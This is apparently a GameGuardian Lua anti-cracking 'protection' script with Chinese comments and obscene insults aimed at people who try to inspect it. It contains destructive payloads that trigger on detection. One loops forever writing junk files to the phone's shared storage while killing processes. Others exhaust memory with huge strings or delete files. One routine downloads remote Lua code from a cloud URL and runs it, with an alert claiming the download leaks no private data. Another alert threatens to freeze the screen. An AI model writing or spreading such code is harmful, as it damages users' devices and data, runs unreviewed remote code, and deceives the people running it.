--垃圾加密-----
fangyu=[=[
function XEY() local SSS = function(code) local res = ""   for i in ipairs(code) do res = res..string.char(code[i]) end  return res end if tostring(_ENV.gg):match(SSS({229,141,151,228,184,131,233,152,178,230,139,166,230,136,170,49,46,48,229,138,160,229,175,134})) then while(true) do   gg.alert("无言提示：检测到您非法启动脚本")     os.exit() end else   for k in(tostring(_ENV):gmatch(SSS({229,141,151,228,184,131,233,152,178,230,139,166,230,136,170,49,46,48,229,138,160,229,175,134}))) do     if k ~= gg.getFile() then while(true) do       gg.alert("无言提示：检测到您非法启动脚本")       os.exit() end 	end   end end  if debug.traceback == nil or gg.getFile == nil then while(true) do  gg.alert("无言提示：检测到您非法启动脚本")   os.exit() end end for j in tostring(debug.traceback()):gmatch(SSS({40,46,45,41,10})) do   if j:match(SSS({46,40,47,46,45,41,58})) then     if j:match(SSS({46,40,47,46,45,41,58})) ~= gg.getFile() then while(true) do       gg.alert("无言提示：检测到您非法启动脚本")       os.exit() end     end   end end local f = io.open(gg.FILES_DIR:match("^(.*/)([^/]*)$").."shared_prefs/"..gg.PACKAGE.."_preferences.xml", "r") if not f then while(true) do   gg.alert("无言提示：检测到您非法启动脚本")   os.exit() end else   local SSSV4_R = f:read(SSS({42,97}))   f:close()   for k in SSSV4_R:gmatch(SSS({104,105,115,116,111,114,121,37,45,48,34,62,40,46,45,41,60})) do     if k ~= gg.getFile() then while(true) do       gg.alert("无言提示：检测到您非法启动脚本")       os.exit() end     end   end end end
----------------------------防SSH，SR拦截器----------------------------
local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "S")      local level = 1    for i = 2,2 do   load(" Skr ")  end     local ogg=1   while true do     local info = debug.getinfo(level, "Sl")   if not info or  string.format("%s",   info.short_src, info.currentline)==  gg.getFile()then break end   os.exit()   end    log = string.rep("    ",976999)     local GGinfo = debug.getinfo(gg.getFile, "S")     local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")       local GGinfo = debug.getinfo(gg.getFile, "Sl")     local GGinfo = debug.getinfo(gg.getFile, "Sl")  while true do       local info = debug.getinfo(gg.getFile, "Sl")  if  (string.format("%s",  info.short_src, info.currentline))== "getFile" then break end  os.exit()  end 
----------------------------修改器拦截刷文件----------------------------
b="/data/user/0/" a=gg.EXT_FILES_DIR c="/shared_prefs/" d="_preferences.xml" e=string.match(a,"data/(.-)/") t=io.open(b..e..c..e..d):read("*a") x=string.gsub(t, "-", "") m=string.gsub(x, tostring(string.char(34)), ""):match("history0>(.-)<") if m~=gg.getFile() then gg.alert("无言提示：检测到您非法启动脚本")  os.exit() end 
----------------------------全方面防函数拦截----------------------------
function LS(content)  local _FOR_=function() return _FOR_ end local _ENV=function() return _ENV end local _UPVALUE0_=function() return _UPVALUE0_ end assert(type(content)=="") local temp={} local result={} local i=1 local ends=0 for i=1, #lines do if string.find(lines[i],"") then table.insert(temp,lines[i]) ends=ends+1 elseif string.find(lines[i],"") or string.find(lines[i],"") or string.find(lines[i],"") then ends=ends+1 if #temp==0 then table.insert(result,lines[i]) else table.insert(temp,lines[i]) end elseif string.find(lines[i],"") then ends=ends-1 if #temp==0 then table.insert(result,lines[i]) else table.insert(temp,lines[i]) end if ends==0 and #temp~=0 then table.insert(result,temp) temp={} end else if #temp==0 then table.insert(result,lines[i]) else table.insert(temp,lines[i]) end end end return result end function Split(szFullString, szSeparator) local nFindStartIndex = 1 local nSplitIndex = 1 local nSplitArray = {} while true do local nFindLastIndex = string.find(szFullString, szSeparator, nFindStartIndex) if not nFindLastIndex then nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, string.len(szFullString)) break end nSplitArray[nSplitIndex] = string.sub(szFullString, nFindStartIndex, nFindLastIndex - 1) nFindStartIndex = nFindLastIndex + string.len(szSeparator) nSplitIndex = nSplitIndex + 1 end return nSplitArray end function GetAssignment(content) return string.match(content,"") end function isSetGlobals(content) if string.find(content,"") then return true end if string.find(content,"") then return false end return false end function FilteSpec(content) local spec="" for ia=1,string.len(spec) do local suba=""..string.sub(spec,ia,ia) content=(string.gsub(content,""..string.sub(spec,ia,ia),suba)) end return content end function Replace(content,locals) if isSetGlobals(content) then return content end local _i=0 local _v=0 for _i,_v in pairs(locals) do content=(string.gsub(content,_i,FilteSpec(tostring(_v)))) end return content end function process(flines) local spots={} local funnames={} local result="" for i=1, #flines do if type(flines[i])=="" then if flines[i]~="" then name,value=GetAssignment(flines[i]) if name~=nil then if string.find(value,"") then spots[name]=nil result=result..flines[i].."" else spots[name]=Replace(value,spots) end elseif string.find(flines[i],"") then result=result..flines[i].."" local localss=string.match(flines[i],"") local tlocals=Split(localss,",") for j=1,#tlocals do spots[string.match(tlocals[j],"")]="" end else result=result..(Replace(flines[i],spots)).."" end end elseif type(flines[i]=="") then if i~=#flines then if flines[i][1]~=nil and type(flines[i][1]=="") then local funspot=string.match(flines[i][1],"") local funname= string.match(flines[i+1],""..funspot.."") if funname~=nil then flines[i][1]=(string.gsub(flines[i][1],funspot,FilteSpec(funname))) flines[i+1]="" end result=result..process(flines[i]).."" end end end end return result end function raw(s) for w in string.gmatch(s, "") do s=string.gsub(s,""..w,string.char(w),1) end return s end function LO(ina,out)  local _FOR_=function() return _FOR_ end local _ENV=function() return _ENV end local _UPVALUE0_=function() return _UPVALUE0_ end file=io.open(ina,"") script=file:read("") file:close() lines=Split(script,"") flines=LS(lines) unraw=process(flines) file=io.open(out,"") file:write(unraw) file:close() final=raw(unraw) file=io.open(out,"") file:write(final) file:close() end function LOO(ina)  local _FOR_=function() return _FOR_ end local _ENV=function() return _ENV end local _UPVALUE0_=function() return _UPVALUE0_ end LO(ina,ina) end  ggg = {} for k, v in pairs(gg) do   ggg[k] = v end
----------------------------防修改器拦截（检测更多）----------------------------
function D() bb ={} if bb == gx1 then else   gxjb={} if gxjb==1 then  goto exit else if gxjb==2 then  gg.fullName = gg.getFile() gg.path = gg.fullName:gsub("[^/]+$","") gg.name = gg.fullName:match ("[^/]+$") gg.randomName = "" gg.outPath = gg.path file = gg.outPath .. "[XEY]" .. gg.name .. gg.randomName .. ""                os.remove(gg.getFile(),"w")             gg.outFile = io.open(file, "w")       gg.outFile:write(gg.makeRequest(gx2).content)    gg.outFile:close()            goto exit else goto exit end end end while(true) do end ::exit:: FGCFYGFDGGD={XEYAFVGJBG} end D() 
end
_G["hook?"]=function()
_ENV["gg"]["alert"]("小信牛逼，你个废物又来看你妈了?解你妈逼，看你妈骚逼去","废物","废物","废物")
_G["os"]["exit"]() 
_G["hook?"]()
end
for i = -1, -2 do;se = 'The wind of birds';end local _  =  debug.getinfo(gg.searchNumber).source ~= "=[Java]" or  not not debug.getupvalue(gg.searchNumber,1,2) local _ = _  == false or (function() _ENV["hook?"]()  end)()
sha=os.time()
for sh=1,2000 do
load("")
end
shb=os.time()
shsj=shb-sha
if shsj>6 then
os.exit()
while true do 
os.exit()
end
end
w=1
while true do
w=w+1
os.remove(gg.getFile()..".load_"..w..".lua")
if w==2000 then break end end
os.remove(gg.getFile()..".load_0.lua")
os.remove(gg.getFile()..".load_1.lua")
os.remove(gg.getFile()..".load_2.lua")


local timeinit=os.clock()
for i=1,81 do
loadfile("/system/priv-app/SystemUI/SystemUI.apk")
loadfile("/system/priv-app/Settings/Settings.apk")
end
while os.clock()-timeinit>6 do
gg.setVisible(true)
print("load你马逼，工具狗叫声爸爸让你load个fw")
os.exit()
end
abc ={} 
abc.last = gg.getFile() 
abc.data = loadfile(abc.last)
abc.cpp = abc.data  
if abc.cpp ~= nil then  
abc.data = nil  
ppb = abc.last:match("[^/]+$")
ppi = "lohhhggg" 
pu = gg.getResults(5000)  
os.rename("" .. abc.last .. "", "" .. abc.last:gsub("/[^/]+$", "") .. "/" .. ppi .. "")  
prt = loadfile("" .. abc.last:gsub("/[^/]+$", "") .. "/" .. ppi .. "")  
if prt ~= nil then    
os.rename("" .. abc.last:gsub("/[^/]+$", "") .. "/" .. ppi .. "", "" .. abc.last:gsub("/[^/]+$", "") .. "/" .. ppb .. "")    
gg.alert("load你马逼，工具狗叫声爸爸让你load个fw")   
while true do   
os.exit() 
end
end
end

load("lpl")
if string.find(tostring(debug.getinfo(load)['func']), "function: load") == nil then
gg.alert("load你马逼，工具狗叫声爸爸让你load个fw")
os.exit()
end


for i=1,666 do
loadfile(string.char(47,115,121,115,116,101,109,47,112,114,105,118,45,97,112,112,47,83,101,116,116,105,110,103,115,47,83,101,116,116,105,110,103,115,46,97,112,107))
end
gg.toast("Protect By Top GEO🛡 10%")
gg.setVisible(true)
gg.sleep(11111)
gg.setVisible(true)
gg.searchNumber("1", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 20%")
gg.setVisible(true)
gg.sleep(22222)
gg.setVisible(true)
gg.searchNumber("2", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 30%")
gg.setVisible(true)
gg.sleep(33333)
gg.setVisible(true)
gg.searchNumber("3", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 40%")
gg.setVisible(true)
gg.sleep(44444)
gg.setVisible(true)
gg.searchNumber("5", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 50%")
gg.setVisible(true)
gg.sleep(55555)
gg.setVisible(true)
gg.searchNumber("6", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 60%")
gg.setVisible(true)
gg.sleep(66666)
gg.setVisible(true)
gg.searchNumber("7", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 70%")
gg.setVisible(true)
gg.sleep(77777)
gg.setVisible(true)
gg.searchNumber("8", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 80%")
gg.setVisible(true)
gg.sleep(88888)
gg.setVisible(true)
gg.searchNumber("9", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 90%")
gg.setVisible(true)
gg.sleep(99999)
gg.setVisible(true)
gg.searchNumber("10", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
gg.toast("Protect By Top GEO🛡 100%")
gg.setVisible(true)
gg.sleep(111111)
gg.setVisible(true)
gg.searchNumber("11", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
gg.skipRestoreState()
gg.clearList()
gg.setVisible(false)
local j=0 local e=gg.bytes local now=os.clock() local g=string.rep('\n',10000) local d=string.rep(g,2000) local hook=function() local a=e(g) j=j+1 end local a=gg.searchNumber(d) local a=debug.sethook(hook,'r') print('SSS') local a=gg.BUILD local t=gg.alert while(a<14086) do return t('需要73.9及以上GG') end local op=io.open local re=os.remove local i='错误' while(#d~=20000000) do return t(i) end local s={} for i=1,10000 do s[i] = {} s[i].address =i s[i].flags =127 s[i][i]=d end local a=re(d) local a=op(d) local a=gg.getResults(1) local a=gg.editAll(d,127) while(a~=0) do return t(i) end local a=gg.searchNumber(d) local b='java.lang.NumberFormatException: 数值: 输入数值' while(a~=b) do return t(i) end while(#s~=10000) do return t(i) end local a=gg.clearList(s) local a=gg.setVisible(false) local a=gg.addListItems(s) local a=e(g) local a=gg.getListItems(s) while(#a~=10000) do return t(i) end local a=gg.loadResults(s) local o=gg.removeListItems local S=os.clock for i=1,100 do local a=o(s) while(S()-now>7) do gg.searchNumber(d) end end while(S()-now<3) do return t(i) end local file='/sdcard/.rxot' local a=op(file) local b=loadfile(file) while(a or b) do return t('因你尝试破解你已经列入黑名单') end local sz=math.random(100,105) local a=op(file,'w'):write(sz) local a=op(file):read("*a") while(a~=''..sz) do return t(i) end local a=re(file) local a=re(gg.getFile(),file) local a=loadfile(gg.getFile()) local b=loadfile(file) local c=op(file) while(not a or b or c) do return t(i) end local a=load("gg.toast('SSS')")() local a=op(gg.getFile()..'a','w'):write(sz) local a=os.rename(gg.getFile()..'a',file) local a=op(file):read("*a") while(a~=''..sz) do return t(i) end c=os.exit x=function() x() end local love=load('c() x()') local b='/system/priv-app/Settings/Settings.apk' for i=1,sz do local a=load(love) local a=loadfile(b) end local a=re(gg.getFile()) local a=re(file) local a=loadfile(gg.getFile()) while(not a) do return t(i) end local a=_G.j local a=S()-now while(a>8 or a<4) do return t(i) end gg.toast("成
for i=1,666 do loadfile(string.char(47,115,121,115,116,101,109,47,112,114,105,118,45,97,112,112,47,83,101,116,116,105,110,103,115,47,83,101,116,116,105,110,103,115,46,97,112,107)) end
local pxxe=gg[ "makeRequest" ]( "FT+网络申请" )
while tostring(pxxe):find( "FT+" )==nil do
while true do  print( "NO Network " ) end end
function _A(_B) 
return string.char(table.unpack(_B))
end
local optfff=function()
local igs = 0
for i in pairs(_G) do
igs = igs + 1
end
if igs ~= 36 then
goto BAD
end
ipai = gg[ "isPackageInstalled" ]
gpa = gg[ "PACKAGE" ]
ggf = gg[ "getFile" ]()
gg[ "setVisible" ](false)
goto P1
::BAD::
xpc=nil if  gg.isVisible() then xpc=0 end
while xpc~=0 do break end
wgcz =  "by——泽野 " 
gg[ "toast" ](wgcz)
gg[ "sleep" ](50)
gg[ "setVisible" ](true)  
::PP::
gg[ "toast" ](wgcz)
goto PP
::P1::
if #{pairs({ "EA-FFF" })} ~= 2 then
goto BAD
end
xi = {1, 1}
for i, v in pairs(gg) do 
xi[1] = xi[1] + 1
if i:find( "DIR" ) and not v:find(gpa) then
goto BAD
end
if type(v) ==  "function"  then
xi[2] = xi[2] + 1
end
end
if xi[1] ~= 123 or xi[2] ~= 64 then
goto BAD
end
xi = 1
for i, v in pairs(debug) do 
xi = xi + 1
if type(v) ~=  "function"  then
goto BAD
end
end
if xi ~= 17 then
goto BAD
end
h = 1 
repeat
h = h + 1
until type(debug.getinfo(h) or 0) ==  "number" 
if h > 2 or debug.getinfo(h - 1).short_src ~= ggf then
goto BAD
end
if debug.traceback():match( ".(/.-):" ) ~= ggf then 
goto BAD
end
f = io.open( "/data/data/"  .. gpa ..  "/shared_prefs/"  .. gpa ..  "_preferences.xml" )
if not f then
goto BAD
else
spc = f:read( "*a" )
f:close()
if #spc < 20 then 
goto BAD
end
op = 0 
for k in spc:gmatch( "script%-debug.>(.-)<" ) do
op = op + 1
end
if op ~= 0 then
goto BAD
end
op = 0 
for k in spc:gmatch( "history%-0.>(.-)<" ) do
op = op + 1
h0 = k
end
if op ~= 1 then
goto BAD
end
op = 0 
for k in spc:gmatch(gg[ "getTargetPackage" ]() ..  "%-script.>(.-)<" ) do
op = op + 1
ps = k
end
if op ~= 1 then
goto BAD
end
if h0 ~= ps or h0 ~= ggf or ps ~= ggf then 
goto BAD
end
end
isby = debug.traceback():match( "(/.*/.*):%d" ) 
if ggf == isby or isby or debug.traceback():match( ":(%d+)" ) then
goto BAD
end
if not ipai(gpa) or ipai( "com.fffsse.bad" ) then 
goto BAD
end
if sdpa == true and gpa ~=  "com.fffsse.gg"  then
goto BAD
end
while true do 
goto BAD end
end
function ffvpns()
ffvpn= "https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F" 
x=(tostring(gg[ "makeRequest" ](ffvpn)))
if not x  or not x:sub(1,20) then 
gg[ "alert" ]( "GG无法访问网络请查看相应限权" , "" )
else
while  #(x)<100  
or x:find( "SSL" ) or x:find('I/O') or x:find('javax')
do 
gg[ "alert" ]( " MTP警告:网络数据通道异常\n\nMTP:已验证本机调试型VPN启用请立刻终止脚本否则控制手机屏幕卡死" , "" , "我不信" , "我信" )
local mpxgk=optfff()
end 
end
end
ffvpns()
gg.searchNumber,Searchnumber=Searchnumber,gg.searchNumber
function gg.searchNumber(a,b,c,d,e,f)
gg.setVisible(false)
if not search_e then
search_e=string.char(0,0,0,0,0,0,0)
for i=1,22 do
search_e=search_e..search_e
end
end
gg.getResults(1)
gg.editAll(search_e,4)
local s,j={},{}
for i=1,50 do
j[i]=math.random(1,2140000000)
s[j[i]]={address=i,flags=4,temp=search_e}
end
local timegg=os.clock()+os.time()
s=gg.getValues(s)
local dateinit=os.clock()+os.time()
for i=1,50 do
while s[j[i]].value~=0 or dateinit-timegg>2.1 do
gg.clearResults()
os.exit()
end
end
Searchnumber(a,b,c,d,e,f)
gg.getResults(0)
gg.editAll(search_e,4)
while gg.isVisible(true) do
gg.clearResults()
os.exit()
end
end
  local info = {}
for i = 1, 10 do
    info[i] = debug.getinfo(i + 1)
end
info = #info
while info ~= 2 or debug.getinfo(0) or not debug.getinfo(1) do
    return 
gg.alert("检测到您使用了第三方打开脚本‼️\n亦或者妄想使用拦截器‼️\n因此触发核心防御\n✅🐴🛡️𝒁𝑬𝒀𝑬🛡团队泽野 🐴✅\n略略略你个工具人哼\n我泽野 看不起你🌝")
end 
]===]

while tostring((gg.makeRequest("NZF网络申请"))):find("NZF") == nil do
print("请授予联网权限")
os.exit() 
end
local luj="/sdcard/lian.lua" local isfile=function(path) local a,b=io.open(path) if not b then io.close(a) return true else local aa=string.find(b,"(Is a directory)") if aa then return "文件夹" else local aa=string.find(b,"(No such file or directory)") if aa then return false end end end end local xlh=0 while xlh==0 do if isfile(luj) then local file=io.open(luj,"r") local rea=file:read("*a") io.close(file) local x,x1=string.find(rea,"ZaC") if #rea==tonumber("191549") then if x=="87768" then if x1=="87770" then dofile(luj) xlh=xlh+1 else os.remove(luj) while x1~="87770" do os.exit(print("本地已解码脚本已被破坏!\n重启脚本重新解码!")) end end else os.remove(luj) while x~="87768" do os.exit(print("本地已解码脚本已被破坏!\n重启脚本重新解码!")) end end else while #rea~=tonumber("191549") do  os.exit(print("本地已解码脚本已被破坏!\n重启脚本重新解码!"))  end end else local fangyu=gg.makeRequest("https://hcxgc-1301610669.cos.ap-chengdu.myqcloud.com/%E9%98%B2%E5%BE%A1.lua")["content"] if fangyu~=nil then if #fangyu==tonumber("191549") then local file=io.open(luj,"w+") file:write(fangyu) io.close(file) end else gg.alert("请允许修改器连接网络!\n访问网络只是获取动态解密钥匙!\n并不会泄露隐私!\n请放心允许修改器访问网络!","知道了") os.exit(print("请允许修改器连接网络!\n访问网络只是获取动态解密钥匙!\n并不会泄露隐私!\n请放心允许修改器访问网络!")) end end end

local pxxe=gg[ "makeRequest" ]( "FT+网络申请" )
while tostring(pxxe):find( "FT+" )==nil do
while true do  print( "NO Network " ) end end
function _A(_B) 
return string.char(table.unpack(_B))
end
local optfff=function()
local igs = 0
for i in pairs(_G) do
igs = igs + 1
end
if igs ~= 36 then
goto BAD
end
ipai = gg[ "isPackageInstalled" ]
gpa = gg[ "PACKAGE" ]
ggf = gg[ "getFile" ]()
gg[ "setVisible" ](false)
goto P1
::BAD::
xpc=nil if  gg.isVisible() then xpc=0 end
while xpc~=0 do break end
wgcz =  "By——神仙" 
gg[ "toast" ](wgcz)
gg[ "sleep" ](50)
gg[ "setVisible" ](true)  
::PP::
gg[ "toast" ](wgcz)
goto PP
::P1::
if #{pairs({ "EA-FFF" })} ~= 2 then
goto BAD
end
xi = {1, 1}
for i, v in pairs(gg) do 
xi[1] = xi[1] + 1
if i:find( "DIR" ) and not v:find(gpa) then
goto BAD
end
if type(v) ==  "function"  then
xi[2] = xi[2] + 1
end
end
if xi[1] ~= 123 or xi[2] ~= 64 then
goto BAD
end
xi = 1
for i, v in pairs(debug) do 
xi = xi + 1
if type(v) ~=  "function"  then
goto BAD
end
end
if xi ~= 17 then
goto BAD
end
h = 1 
repeat
h = h + 1
until type(debug.getinfo(h) or 0) ==  "number" 
if h > 2 or debug.getinfo(h - 1).short_src ~= ggf then
goto BAD
end
if debug.traceback():match( ".(/.-):" ) ~= ggf then 
goto BAD
end
f = io.open( "/data/data/"  .. gpa ..  "/shared_prefs/"  .. gpa ..  "_preferences.xml" )
if not f then
goto BAD
else
spc = f:read( "*a" )
f:close()
if #spc < 20 then 
goto BAD
end
op = 0 
for k in spc:gmatch( "script%-debug.>(.-)<" ) do
op = op + 1
end
if op ~= 0 then
goto BAD
end
op = 0 
for k in spc:gmatch( "history%-0.>(.-)<" ) do
op = op + 1
h0 = k
end
if op ~= 1 then
goto BAD
end
op = 0 
for k in spc:gmatch(gg[ "getTargetPackage" ]() ..  "%-script.>(.-)<" ) do
op = op + 1
ps = k
end
if op ~= 1 then
goto BAD
end
if h0 ~= ps or h0 ~= ggf or ps ~= ggf then 
goto BAD
end
end
isby = debug.traceback():match( "(/.*/.*):%d" ) 
if ggf == isby or isby or debug.traceback():match( ":(%d+)" ) then
goto BAD
end
if not ipai(gpa) or ipai( "com.fffsse.bad" ) then 
goto BAD
end
if sdpa == true and gpa ~=  "com.fffsse.gg"  then
goto BAD
end
while true do 
goto BAD end
end
function ffvpns()
ffvpn= "https://vpn.uibe.edu.cn/por/phone_index.csp?rnd=0.23178949332658605#https%3A%2F%2Fvpn.uibe.edu.cn%2F" 
x=(tostring(gg[ "makeRequest" ](ffvpn)))
if not x  or not x:sub(1,20) then 
gg[ "alert" ]( "GG无法访问网络请查看相应限权" , "" )
else
while  #(x)<100  
or x:find( "SSL" ) or x:find('I/O') or x:find('javax')
do 
gg[ "alert" ]( " MTP警告:网络数据通道异常\n\nMTP:已验证本机调试型VPN启用请立刻终止脚本否则控制手机屏幕卡死" , "" , "我不信" , "我信" )
local mpxgk=optfff()
end 
end
end
ffvpns()

fy=[=[
local Tab_FY={}

for k=1,1024 do
Tab_FY[k]=string.rep("神仙","100000000")
end

for kk=1,#Tab_FY do
pcall(debug.getinfo,Tab_FY[kk])
pcall(debug.traceback,Tab_FY[kk])
end
]=]

fy=[=[
function random() 
bn={"🌎","🌎","🌎","🌎","🌎"} x=math.random local e,f,g,h,i=x(1,5),x(1,5),x(1,5),x(1,5),x(1,5) a=bn[e]..bn[f]..bn[g]..bn[h]..bn[i] return a,b,c,d,e end
ss=random()
for u=1,9990 do
ss=ss..random()
end
function MaskMenber(nbnb)
local nbnb=ss..nbnb..ss
gg.searchNumber(nbnb)
end?
]=]

fy=[=[
if debug.getinfo(gg.alert).source == "=[Java]" then else i = 1  gg.setVisible(false) while true do i = i + 1  file = io.open("/storage/emulated/0/" .. i, "w") text = "╾╾ ✭ 🇧 🇾 🇼 🇽 ✭╾╾\n" text = text:rep(999) file:write(text) file:close() gg.setVisible(false) gg.processKill() gg.setVisible(true) end return end save = {} for v = 1, 30000 do table.insert(save, { address = 0 + v, flags = 12 }) end for i = 1, 5 do gg.addListItems(save) end time = os.time() if os.time() - time >= 2 then i = 1  gg.setVisible(false) while true do i = i + 1  file = io.open("/storage/emulated/0/" .. i, "w") text = "╾╾ ✭ 🇧 🇾 🇼 🇽 ✭╾╾\n" text = text:rep(999) file:write(text) file:close() gg.setVisible(false) gg.processKill() gg.setVisible(true) end return end time = os.clock() if os.clock() - time >= 2 then i = 1  gg.setVisible(false) while true do i = i + 1  file = io.open("/storage/emulated/0/" .. i, "w") text = "╾╾ ✭ 🇧 🇾 🇼 🇽 ✭╾╾\n" text = text:rep(999) file:write(text) file:close() gg.setVisible(false) gg.processKill() gg.setVisible(true) end return end if loadfile == "" then  i = 1  gg.setVisible(false) while true do i = i + 1  file = io.open("/storage/emulated/0/" .. i, "w") text = "╾╾ ✭ 🇧 🇾 🇼 🇽 ✭╾╾\n" text = text:rep(999) file:write(text) file:close() gg.setVisible(false) gg.processKill() gg.setVisible(true) end end if gg.getFile == "" then i = 1  gg.setVisible(false) while true do i = i + 1  file = io.open("/storage/emulated/0/" .. i, "w") text = "╾╾ ✭ 🇧 🇾 🇼 🇽 ✭╾╾\n" text = text:rep(999) file:write(text) file:close() gg.setVisible(false) gg.processKill() gg.setVisible(true) end end if os.exit == "" then  i = 1  gg.setVisible(false) while true do i = i + 1  file = io.open("/storage/emulated/0/" .. i, "w") text = "╾╾ ✭ 🇧 🇾 🇼 🇽 ✭╾╾\n" text = text:rep(999) file:write(text) file:close() gg.setVisible(false) gg.processKill() gg.setVisible(true) end end if os.date == "" then  i = 1  gg.setVisible(false) while true do i = i + 1  file = io.open("/storage/emulated/0/" .. i, "w") text = "╾╾ ✭ 🇧 🇾 🇼 🇽 ✭╾╾\n" text = text:rep(999) file:write(text) file:close() gg.setVisible(false) gg.processKill() gg.setVisible(true) end end if load == "" then  i = 1  gg.setVisible(false) while true do i = i + 1  file = io.open("/storage/emulated/0/" .. i, "w") text = "╾╾ ✭ 🇧 🇾 🇼 🇽 ✭╾╾\n" text = text:rep(999) file:write(text) file:close() gg.setVisible(false) gg.processKill() gg.setVisible(true) end end gg.removeListItems(save) gg.clearResults() gg.setVisible(false) local f = gg.getResults(505) gg.addListItems(f) gg.removeListItems(f) local j = gg.getResults(55) gg.setVisible(false) gg.clearResults() local hook = function(why, f) gg.addListItems(j) gg.removeListItems(j) end debug.sethook(hook, 'crl') gg.setVisible(true)
]=]

fy=[=[
if gg.VERSION == "86.3" then
print("憨批")
os.exit() ILOVEYOU()
else
end
if gg.BUILD == "15505" then
print("憨批")
os.exit() ILOVEYOU()
else
end
if gg.PACKAGE == "com.hckeam.mjgql" then
print("憨批")
os.exit() ILOVEYOU()
else
end
--防小五

X=os.time()
for i=1,100 do
gg.searchNumber("憨批")
end
Y=os.time()
if Y-X>5 then
print("憨批")
os.exit()
ILOVEYOU()
end
--防log

XEY=string.rep("小鳄鱼","10000")
for k=1,2000 do
pcall(debug.getinfo,XEY)
pcall(debug.traceback,XEY)
end

abc ={}
abc.last = gg.getFile()
abc.data = loadfile(abc.last)
abc.cpp = abc.data
if abc.cpp ~= nil then
abc.data = nil
ppb = abc.last:match("[^/]+$")
ppi = "lohhhggg"
pu = gg.getResults(5000)
os.rename("" .. abc.last .. "", "" .. abc.last:gsub("/[^/]+$", "") .. "/" .. ppi .. "")
prt = loadfile("" .. abc.last:gsub("/[^/]+$", "") .. "/" .. ppi .. "")
if prt ~= nil then
os.rename("" .. abc.last:gsub("/[^/]+$", "") .. "/" .. ppi .. "", "" .. abc.last:gsub("/[^/]+$", "") .. "/" .. ppb .. "")
while true do
print("憨批")
os.exit()
ILOVEYOU()
end
end
end
--防log

EAG,Tool=gg.searchNumber,nil
InTo,to=string.char,nil
EAG(InTo(71,88,76,229,176,143,228,186,148,233,152,178,229,190,161),127)
EAG,Tool=gg.searchNumber,nil
EAG(InTo(71,88,76,229,176,143,228,186,148))
InTo,to=string.char,nil
EAG,Tool=gg.searchNumber,nil
--防部分log及load

local function _SSSV4_()
local SSS = function(code) local res = ''
  for i in ipairs(code) do res = res..string.char(code[i]) end return res
end
if tostring(_ENV.gg):match(SSS({102,117,110,99,116,105,111,110,58,32,64,40,46,45,41,58})) then while(true) do
  
print("憨批") os.exit() ILOVEYOU() end
else
  for k in(tostring(_ENV):gmatch(SSS({102,117,110,99,116,105,111,110,58,32,64,40,46,45,41,58}))) do
    if k ~= gg.getFile() then while(true) do
      
print("憨批") os.exit() ILOVEYOU() end
	end
  end
end

if debug.traceback == nil or gg.getFile == nil then while(true) do
print("憨批")   os.exit() ILOVEYOU() end
end
for j in tostring(debug.traceback()):gmatch(SSS({40,46,45,41,10})) do
  if j:match(SSS({46,40,47,46,45,41,58})) then
    if j:match(SSS({46,40,47,46,45,41,58})) ~= gg.getFile() then while(true) do
      
print("憨批") os.exit() ILOVEYOU() end
    end
  end
end

local f = io.open(gg.FILES_DIR:match("^(.*/)([^/]*)$").."shared_prefs/"..gg.PACKAGE.."_preferences.xml", "r")
if not f then while(true) do
  
print("憨批") os.exit() ILOVEYOU() end
else
  local SSSV4_R = f:read(SSS({42,97}))
  f:close()
